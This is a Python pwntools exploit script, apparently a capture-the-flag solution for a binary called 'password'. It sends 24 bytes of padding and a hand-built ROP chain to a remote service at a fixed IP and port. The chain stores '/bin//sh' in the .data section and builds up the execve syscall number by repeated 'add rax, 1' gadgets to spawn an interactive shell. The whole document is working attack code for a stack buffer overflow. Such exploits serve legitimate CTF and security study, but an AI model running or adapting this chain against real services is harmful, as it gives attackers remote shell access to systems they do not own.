from pwn import *
import string
# context(log_level ="debug")

# p = remote("106.75.32.60",10000)

from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000401547) # pop rsi ; ret
p += pack('<Q', 0x00000000006b01c0) # @ .data
p += pack('<Q', 0x0000000000432bfd) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000460161) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401547) # pop rsi ; ret
p += pack('<Q', 0x00000000006b01c8) # @ .data + 8
p += pack('<Q', 0x00000000004197ff) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000460161) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040142e) # pop rdi ; ret
p += pack('<Q', 0x00000000006b01c0) # @ .data
p += pack('<Q', 0x0000000000401547) # pop rsi ; ret
p += pack('<Q', 0x00000000006b01c8) # @ .data + 8
p += pack('<Q', 0x0000000000434595) # pop rdx ; ret
p += pack('<Q', 0x00000000006b01c8) # @ .data + 8
p += pack('<Q', 0x00000000004197ff) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004542f0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000454e15) # syscall ; ret


# pr = process('./password')
pr = remote("202.120.7.242",6666)
pr.recvuntil("!:\n")
# gdb.attach(pr,"b*0x400A23\nc")
pr.sendline("a"*24+p)
pr.interactive()